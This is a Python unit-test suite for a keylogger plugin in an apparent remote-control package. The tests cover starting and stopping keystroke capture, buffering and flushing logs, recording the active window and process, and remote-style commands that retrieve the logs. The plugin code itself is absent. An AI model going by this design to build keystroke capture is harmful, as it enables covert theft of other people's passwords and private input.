"""
Unit tests for KeyloggerPlugin

Tests keylogger functionality including start/stop, buffering, overflow handling,
and active window context capture.

Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6
"""

import unittest
import time
import tempfile
import os
from unittest.mock import Mock, patch, MagicMock
from collections import deque

# Import the plugin
from remote_system.plugins.keylogger_plugin import KeyloggerPlugin, KeyEvent, PYNPUT_AVAILABLE


class TestKeyloggerPlugin(unittest.TestCase):
    """Test suite for KeyloggerPlugin"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.plugin = KeyloggerPlugin()
    
    def tearDown(self):
        """Clean up after tests"""
        # Ensure keylogger is stopped
        if self.plugin.is_logging:
            self.plugin.stop_logging()
    
    def test_get_name(self):
        """Test plugin name"""
        self.assertEqual(self.plugin.get_name(), "keylogger")
    
    def test_get_required_arguments(self):
        """Test required arguments"""
        required = self.plugin.get_required_arguments()
        self.assertIn('action', required)
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    def test_start_logging(self):
        """
        Test starting keylogger
        
        Requirement: 3.1 - Begin recording keyboard events in the background
        """
        result = self.plugin.start_logging()
        
        self.assertTrue(result['success'])
        self.assertTrue(result['is_running'])
        self.assertEqual(result['buffer_size'], 1000)
        
        # Clean up
        self.plugin.stop_logging()
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    def test_start_logging_custom_buffer_size(self):
        """
        Test starting keylogger with custom buffer size
        
        Requirement: 3.2 - Buffer keystrokes with configurable buffer size
        """
        result = self.plugin.start_logging(buffer_size=500)
        
        self.assertTrue(result['success'])
        self.assertEqual(result['buffer_size'], 500)
        self.assertEqual(self.plugin.buffer.maxlen, 500)
        
        # Clean up
        self.plugin.stop_logging()
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    def test_start_logging_already_running(self):
        """Test starting keylogger when already running"""
        self.plugin.start_logging()
        result = self.plugin.start_logging()
        
        self.assertFalse(result['success'])
        self.assertIn('already running', result['message'].lower())
        
        # Clean up
        self.plugin.stop_logging()
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    def test_stop_logging(self):
        """
        Test stopping keylogger
        
        Requirement: 3.4 - Cease recording and clear buffer if requested
        """
        self.plugin.start_logging()
        result = self.plugin.stop_logging()
        
        self.assertTrue(result['success'])
        self.assertFalse(result['is_running'])
        self.assertTrue(result['buffer_cleared'])
    
    def test_stop_logging_not_running(self):
        """Test stopping keylogger when not running"""
        result = self.plugin.stop_logging()
        
        self.assertFalse(result['success'])
        self.assertIn('not running', result['message'].lower())
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    def test_stop_logging_without_clearing_buffer(self):
        """
        Test stopping keylogger without clearing buffer
        
        Requirement: 3.4 - Clear buffer if requested
        """
        self.plugin.start_logging()
        
        # Add mock events to buffer
        self.plugin.buffer.append(KeyEvent(
            timestamp=time.time(),
            key='a',
            window_title='Test',
            window_process='test.exe'
        ))
        
        result = self.plugin.stop_logging(clear_buffer=False)
        
        self.assertTrue(result['success'])
        self.assertFalse(result['buffer_cleared'])
        self.assertEqual(len(self.plugin.buffer), 1)
    
    def test_get_logs(self):
        """
        Test retrieving logs
        
        Requirement: 3.3 - Return recorded keystrokes with timestamps
        """
        # Add mock events to buffer
        event1 = KeyEvent(
            timestamp=1234567890.0,
            key='a',
            window_title='Notepad',
            window_process='notepad.exe'
        )
        event2 = KeyEvent(
            timestamp=1234567891.0,
            key='b',
            window_title='Notepad',
            window_process='notepad.exe'
        )
        
        self.plugin.buffer.append(event1)
        self.plugin.buffer.append(event2)
        
        result = self.plugin.get_logs()
        
        self.assertTrue(result['success'])
        self.assertEqual(result['count'], 2)
        self.assertTrue(result['buffer_cleared'])
        
        # Verify log structure
        logs = result['logs']
        self.assertEqual(logs[0]['timestamp'], 1234567890.0)
        self.assertEqual(logs[0]['key'], 'a')
        self.assertEqual(logs[0]['window_title'], 'Notepad')
        self.assertEqual(logs[0]['window_process'], 'notepad.exe')
        
        # Buffer should be cleared
        self.assertEqual(len(self.plugin.buffer), 0)
    
    def test_get_logs_without_clearing(self):
        """Test retrieving logs without clearing buffer"""
        # Add mock event
        event = KeyEvent(
            timestamp=time.time(),
            key='x',
            window_title='Test',
            window_process='test.exe'
        )
        self.plugin.buffer.append(event)
        
        result = self.plugin.get_logs(clear_buffer=False)
        
        self.assertTrue(result['success'])
        self.assertEqual(result['count'], 1)
        self.assertFalse(result['buffer_cleared'])
        
        # Buffer should not be cleared
        self.assertEqual(len(self.plugin.buffer), 1)
    
    def test_is_running(self):
        """Test checking if keylogger is running"""
        # Initially not running
        result = self.plugin.is_running()
        self.assertFalse(result['is_running'])
        
        # Start logging (if pynput available)
        if PYNPUT_AVAILABLE:
            self.plugin.start_logging()
            result = self.plugin.is_running()
            self.assertTrue(result['is_running'])
            # Buffer size should match the maxlen of the deque
            self.assertGreater(result['buffer_size'], 0)
            self.assertEqual(result['current_count'], 0)
            
            # Clean up
            self.plugin.stop_logging()
    
    def test_buffer_overflow_discard(self):
        """
        Test buffer overflow with discard action
        
        Requirement: 3.6 - Discard oldest entries on buffer overflow
        """
        # Create plugin with small buffer
        self.plugin.buffer = deque(maxlen=3)
        self.plugin.overflow_action = "discard"
        
        # Add events beyond capacity
        for i in range(5):
            event = KeyEvent(
                timestamp=time.time(),
                key=str(i),
                window_title='Test',
                window_process='test.exe'
            )
            self.plugin.buffer.append(event)
        
        # Should only have last 3 events
        self.assertEqual(len(self.plugin.buffer), 3)
        
        # Verify oldest were discarded
        keys = [event.key for event in self.plugin.buffer]
        self.assertEqual(keys, ['2', '3', '4'])
    
    def test_buffer_overflow_flush(self):
        """
        Test buffer overflow with flush action
        
        Requirement: 3.6 - Flush to storage on buffer overflow
        """
        # Create temporary file for flushing
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            flush_file = f.name
        
        try:
            # Configure plugin for flushing
            self.plugin.buffer = deque(maxlen=2)
            self.plugin.overflow_action = "flush"
            self.plugin.flush_file = flush_file
            
            # Manually add events and flush
            event1 = KeyEvent(
                timestamp=1234567890.0,
                key='a',
                window_title='Test',
                window_process='test.exe'
            )
            event2 = KeyEvent(
                timestamp=1234567891.0,
                key='b',
                window_title='Test',
                window_process='test.exe'
            )
            
            self.plugin.buffer.append(event1)
            self.plugin.buffer.append(event2)
            
            # Manually flush oldest
            self.plugin._flush_to_file(self.plugin.buffer[0])
            
            # Verify file was written
            with open(flush_file, 'r') as f:
                content = f.read()
                self.assertIn('1234567890.0', content)
                self.assertIn('a', content)
        
        finally:
            # Clean up
            if os.path.exists(flush_file):
                os.remove(flush_file)
    
    def test_get_active_window_windows(self):
        """
        Test getting active window on Windows
        
        Requirement: 3.5 - Capture active window context
        """
        # Skip if win32gui is not available
        try:
            import win32gui
            import win32process
        except ImportError:
            self.skipTest("win32gui not available")
        
        # Test with mocked win32gui
        with patch('win32gui.GetForegroundWindow', return_value=12345):
            with patch('win32gui.GetWindowText', return_value="Notepad - Untitled"):
                # Temporarily set WIN32_AVAILABLE to True
                original_win32 = self.plugin.__class__.__module__
                
                window_title, window_process = self.plugin._get_active_window()
                
                # On Windows with win32gui available, should get window title
                # Process name may be "unknown" if psutil not available
                self.assertIsInstance(window_title, str)
                self.assertIsInstance(window_process, str)
    
    def test_get_active_window_unsupported(self):
        """Test getting active window on unsupported platform"""
        # Temporarily disable WIN32
        original = self.plugin.__class__.__module__
        
        with patch('remote_system.plugins.keylogger_plugin.WIN32_AVAILABLE', False):
            window_title, window_process = self.plugin._get_active_window()
            
            self.assertEqual(window_title, "unknown")
            self.assertEqual(window_process, "unknown")
    
    @unittest.skipIf(not PYNPUT_AVAILABLE, "pynput not available")
    @patch.object(KeyloggerPlugin, '_get_active_window')
    def test_on_key_press(self, mock_get_window):
        """
        Test keyboard event callback
        
        Requirements: 3.2, 3.5 - Buffer keystrokes and capture window context
        """
        # Mock active window
        mock_get_window.return_value = ("Test Window", "test.exe")
        
        # Create mock key
        mock_key = Mock()
        mock_key.char = 'a'
        
        # Call callback
        self.plugin._on_key_press(mock_key)
        
        # Verify event was added to buffer
        self.assertEqual(len(self.plugin.buffer), 1)
        
        event = self.plugin.buffer[0]
        self.assertEqual(event.key, 'a')
        self.assertEqual(event.window_title, "Test Window")
        self.assertEqual(event.window_process, "test.exe")
        self.assertIsInstance(event.timestamp, float)
    
    def test_execute_start_logging(self):
        """Test execute method with start_logging action"""
        if not PYNPUT_AVAILABLE:
            self.skipTest("pynput not available")
        
        result = self.plugin.execute({
            'action': 'start_logging',
            'buffer_size': 500
        })
        
        self.assertTrue(result['success'])
        self.assertEqual(result['buffer_size'], 500)
        
        # Clean up
        self.plugin.stop_logging()
    
    def test_execute_stop_logging(self):
        """Test execute method with stop_logging action"""
        if not PYNPUT_AVAILABLE:
            self.skipTest("pynput not available")
        
        self.plugin.start_logging()
        
        result = self.plugin.execute({
            'action': 'stop_logging',
            'clear_buffer': True
        })
        
        self.assertTrue(result['success'])
        self.assertTrue(result['buffer_cleared'])
    
    def test_execute_get_logs(self):
        """Test execute method with get_logs action"""
        # Add mock event
        event = KeyEvent(
            timestamp=time.time(),
            key='test',
            window_title='Test',
            window_process='test.exe'
        )
        self.plugin.buffer.append(event)
        
        result = self.plugin.execute({
            'action': 'get_logs',
            'clear_buffer': False
        })
        
        self.assertTrue(result['success'])
        self.assertEqual(result['count'], 1)
    
    def test_execute_is_running(self):
        """Test execute method with is_running action"""
        result = self.plugin.execute({
            'action': 'is_running'
        })
        
        self.assertIn('is_running', result)
        self.assertFalse(result['is_running'])
    
    def test_execute_invalid_action(self):
        """Test execute method with invalid action"""
        with self.assertRaises(ValueError) as context:
            self.plugin.execute({'action': 'invalid_action'})
        
        self.assertIn('Invalid action', str(context.exception))
    
    def test_pynput_not_available(self):
        """Test behavior when pynput is not available"""
        with patch('remote_system.plugins.keylogger_plugin.PYNPUT_AVAILABLE', False):
            plugin = KeyloggerPlugin()
            result = plugin.start_logging()
            
            self.assertFalse(result['success'])
            self.assertIn('pynput', result['message'].lower())


if __name__ == '__main__':
    unittest.main()
